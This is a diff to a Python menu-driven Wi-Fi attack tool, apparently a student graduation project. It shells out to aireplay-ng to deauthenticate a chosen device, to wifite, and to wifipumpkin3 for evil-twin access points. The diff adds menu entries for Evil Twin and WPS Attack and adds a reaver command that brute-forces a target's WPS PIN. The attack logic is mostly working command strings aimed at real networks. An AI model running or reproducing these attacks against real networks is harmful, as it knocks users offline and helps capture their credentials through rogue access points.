@@ -4,7 +4,6 @@ import time
 from time import sleep
 from platform import system
 
-
 logo = """\033[33m
                                                
                        _____
@@ -14,10 +13,9 @@ logo = """\033[33m
                 \___  \ |___/        \ 
                 __/    \    |  /\/\   | 
                 \ _____/____| /    \_/
-
+                
 \033[91m        [✔]        Bitirme Projesi        [✔]
 \033[97m """
-
 
 class Main:
     def __init__(self):
@@ -40,8 +38,10 @@ class Main:
         \033[97m                
         [01] Information Gathering
         [02] List of Device and Deauthentication Attack
-        [03] Wireless Attack With Wifite 
-        [04] Create Fake Access  Point        
+        [03] Wireless Attack via Wifite 
+        [04] Create Fake Access Point
+        [05] Evil Twin via Wifi Pumpkin
+        [06] WPS Attack
         [99] Exit
         """)
 
@@ -88,7 +88,6 @@ class Main:
         if choice == "99":
             self.menu()
 
-
     def deauth(self):
         self.clear_scr()
         os.system("echo \"Listing the devices that are connected to the network and using deauthentication attack on the selected device\"| boxes -d mouse -a c")
@@ -114,8 +113,6 @@ class Main:
             hackableStation = input("Time to deauthentication attack\nEnter STATION ->")
             secondVar = "sudo aireplay-ng --deauth 100 -a {0} -c {1} {2}".format(hackableBSSID,hackableStation,iface)  
             os.system(secondVar)
-
-
             sleep(20)
             self.deauth()
 
@@ -136,7 +133,7 @@ class Main:
 
             if choice == "2":
                 os.system("sudo wifite")
-                sleep(60)
+                sleep(20)
                 self.wifite()
             if choice == "99":
                 self.menu()
@@ -179,6 +176,7 @@ class Main:
 
         if choice == "2":
             os.system("sudo wifipumpkin3")
+            sleep(20)
             self.wifipumkin()
 
         if choice == "99":
@@ -199,16 +197,8 @@ class Main:
             os.system("ifconfig")
             os.system("sudo airmon-ng start wlan0")
             iface= input("Enter interface ->")
-            os.system("sudo airodump-ng {0}".format(iface))
-            hackableChannel = input("Enter Channel ->")
             hackableBSSID = input("Enter Wi-Fi hotspot BSSID ->")
-            firstVar = "sudo airodump-ng --channel {0} --bssid {1} {2}".format(hackableChannel,hackableBSSID,iface)           
-            print("Let's see the MAC addresses of the devices. Don't forget! It was called STATION")
-            os.system(firstVar)
-            #print("Time to deauthentication attack")
-            hackableStation = input("ime to deauthentication attack\nEnter STATION ->")
-            secondVar = "sudo aireplay-ng --deauth 100 -a {0} -c {1} {2}".format(hackableBSSID,hackableStation,iface)  
-            os.system(secondVar)
+            os.system("sudo reaver -i {0} -b {1} -vv".format(iface,hackableBSSID))
             sleep(20)
             self.wpsAttack()
 
@@ -267,11 +257,11 @@ if __name__ == "__main__":
         # If not Linux and probably Windows
         elif system() == "Windows":
             print("\033[91m Please Run This Tool In Debian System For Best Result " "\e[00m")
-            time.sleep(10)
+            time.sleep(5)
 
         else :
             print("Please Check Your Sytem or Open new issue ...")
 
     except KeyboardInterrupt:        
         print("\nExiting...")
-        sleep(10)
+        sleep(3)
